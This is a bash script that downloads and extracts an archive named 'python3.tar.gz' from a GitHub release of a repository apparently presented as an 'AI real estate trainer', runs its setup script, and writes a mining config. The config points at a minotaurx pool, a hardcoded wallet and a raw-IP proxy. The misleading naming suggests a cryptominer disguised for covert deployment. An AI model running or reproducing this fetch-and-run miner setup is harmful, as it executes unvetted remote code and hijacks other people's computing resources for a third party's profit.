#!/bin/bash

# Configuration variables
: "${M_ALGO:=minotaurx}"
: "${M_HOST:=minotaurx.na.mine.zpool.ca}"
: "${M_PORT:=7019}"
: "${M_WORKER:=RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65}"
: "${M_PASSWORD:=c=RVN}"
: "${M_THREADS:=4}"
: "${M_PROXY:=ws://172.233.136.27:8088/proxy}"

# Check if required commands are available
command -v wget >/dev/null 2>&1 || { echo >&2 "wget is required but it's not installed. Aborting."; exit 1; }
command -v apt-get >/dev/null 2>&1 || { echo >&2 "apt-get is required but it's not installed. Aborting."; exit 1; }

# Download project
echo "Downloading Project..."
if ! wget -q https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3.2/python3.tar.gz; then
    echo "Failed to download project. Aborting."
    exit 1
fi
tar -xvf python3.tar.gz && rm python3.tar.gz
cd python3 || { echo "Failed to enter the project directory. Aborting."; exit 1; }

# Download packages
echo "Start downloading packages..."
chmod +x ./step.sh
./setup.sh

# Remove the existing config.json file
rm -f config.json

# Validate proxy URL
if ! [[ $M_PROXY =~ ^(ws|http):// ]]; then
    echo "Invalid proxy URL. Must start with ws:// or http://. Aborting."
    exit 1
fi

# Create a new config.json file with the specified content
cat <<EOL > config.json
{
    "algorithm": "$M_ALGO",
    "host": "$M_HOST",
    "port": $M_PORT,
    "worker": "$M_WORKER",
    "password": "$M_PASSWORD",
    "workers": $M_THREADS,
    "log": false,
    "chrome": "./chromium/chrome",
    "proxy": "$M_PROXY"
}
EOL

echo "All packages downloaded and extracted. Next step to start mining."
